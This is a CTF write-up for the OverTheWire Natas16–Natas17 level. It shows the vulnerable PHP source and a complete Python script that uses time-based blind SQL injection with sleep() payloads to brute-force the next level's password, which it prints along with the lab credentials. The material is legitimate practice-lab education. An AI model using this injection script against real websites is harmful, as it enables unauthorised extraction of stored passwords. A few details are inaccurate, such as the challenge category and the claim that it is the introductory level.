# CTF Writeup - **OverTheWire Natas16 - Natas17**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas16 - Natas17
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 17-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using time based blind injection.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas17
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
URL:      http://natas17.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for an input username.  But we dont know anything about it, So lets input some random names and check it out. 

```bash
Username: natas
Check Existence 
# 
```

Now we see that we are not getting any output. This is interesting. Lets view the source code.

```bash
# <?php

# /*
# CREATE TABLE `users` (
#   `username` varchar(64) DEFAULT NULL,
#   `password` varchar(64) DEFAULT NULL
# );
# */

# if(array_key_exists("username", $_REQUEST)) {
#     $link = mysqli_connect('localhost', 'natas17', '<censored>');
#     mysqli_select_db($link, 'natas17');

#     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
#     if(array_key_exists("debug", $_GET)) {
#         echo "Executing query: $query<br>";
#     }

#     $res = mysqli_query($link, $query);
#     if($res) {
#     if(mysqli_num_rows($res) > 0) {
#         //echo "This user exists.<br>";
#     } else {
#         //echo "This user doesn't exist.<br>";
#     }
#     } else {
#         //echo "Error in query.<br>";
#     }

#     mysqli_close($link);
# } else {
# ?>
```

We can see that there is a small piece of code that is executed when we click on submit.  That takes out input username and appends it to an sql string and executes this sql query and then checks if the return value has greater than 1 then its shows the password. We can see that the query is executed but we can take advantage of this by using a time based sql injection. For this challenge we can use sql query such as `select * from users where username=natas18 and password like binary %a% and sleep(3)`. What essentially happens that it tries to find the details of user with username `natas18` and password that contains `a` if these are available then it sleeps for 3 seconds. if there isnt a entry then it doesn't sleep for 3 seconds. With this knowledge we can build a script which measures a response time of the request and then try to find the password as shown below. This is similar to previous challenge.


```bash
import string
import requests
from requests.auth import HTTPBasicAuth

# Credentials and target URL
username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
url = "http://natas17.natas.labs.overthewire.org"

Auth = HTTPBasicAuth(username, password)
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
filteredchars = ''
passwd = ''
allchars = string.ascii_letters + string.digits

# Step 1: Build the list of valid characters in the password
for char in allchars:
    payload = 'username=natas18" and password like binary "%{}%" and sleep(3)#'.format(char)
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)
    if r.elapsed.seconds >= 3:
        filteredchars = filteredchars + char
        print("validcharacters so far: " + filteredchars)


# Step 2: Brute-force the password character by character
for i in range(0, 32):
    for char in filteredchars:
        payload = 'username=natas18" and password like binary "{}%" and sleep(3)#'.format(passwd + char)
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)
        if r.elapsed.seconds >= 3:
            passwd = passwd + char
            print("password so far:" + passwd)
            break
```

What we are doing here is that we are essentially finding all the characters in the password using the bruteforce approach and time based blind sql injection which checks if the character is present in the passowrd file and sleeps for 3 seconds and then only returns response. if character is present it responds after 3 seconds but if the character is not present then it will respond immediately. With this we will have all the characters in the password. Now we need to determine the order of these characters that is done in the second loop where we build the characters one by one until we find the right order.  

```bash
# validcharacters so far: b
# validcharacters so far: bd
# validcharacters so far: bdg
# validcharacters so far: bdgj
# validcharacters so far: bdgjl
# validcharacters so far: bdgjlp
# validcharacters so far: bdgjlpx
# validcharacters so far: bdgjlpxy
# validcharacters so far: bdgjlpxyB
# validcharacters so far: bdgjlpxyBC
# validcharacters so far: bdgjlpxyBCD
# validcharacters so far: bdgjlpxyBCDG
# validcharacters so far: bdgjlpxyBCDGJ
# validcharacters so far: bdgjlpxyBCDGJK
# validcharacters so far: bdgjlpxyBCDGJKL
# validcharacters so far: bdgjlpxyBCDGJKLO
# validcharacters so far: bdgjlpxyBCDGJKLOP
# validcharacters so far: bdgjlpxyBCDGJKLOPR
# validcharacters so far: bdgjlpxyBCDGJKLOPRV
# validcharacters so far: bdgjlpxyBCDGJKLOPRVZ
# validcharacters so far: bdgjlpxyBCDGJKLOPRVZ1
# validcharacters so far: bdgjlpxyBCDGJKLOPRVZ14
# validcharacters so far: bdgjlpxyBCDGJKLOPRVZ146
# password so far:6
# password so far:6O
# password so far:6OG
# password so far:6OG1
# password so far:6OG1P
# password so far:6OG1Pb
# password so far:6OG1PbK
# password so far:6OG1PbKd
# password so far:6OG1PbKdV
# password so far:6OG1PbKdVj
# password so far:6OG1PbKdVjy
# password so far:6OG1PbKdVjyB
# password so far:6OG1PbKdVjyBl
# password so far:6OG1PbKdVjyBlp
# password so far:6OG1PbKdVjyBlpx
# password so far:6OG1PbKdVjyBlpxg
# password so far:6OG1PbKdVjyBlpxgD
# password so far:6OG1PbKdVjyBlpxgD4
# password so far:6OG1PbKdVjyBlpxgD4D
# password so far:6OG1PbKdVjyBlpxgD4DD
# password so far:6OG1PbKdVjyBlpxgD4DDb
# password so far:6OG1PbKdVjyBlpxgD4DDbR
# password so far:6OG1PbKdVjyBlpxgD4DDbRG
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6Z
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6ZL
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6ZLl
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6ZLlC
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCG
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGg
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC
# password so far:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```


## Flag

**Flag:** 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ


---

## Lessons Learned

It was a bit of challenge for me. I was able to grasp the idead behind the solution very easily. I learnt a lot on how to approach these types of challenges.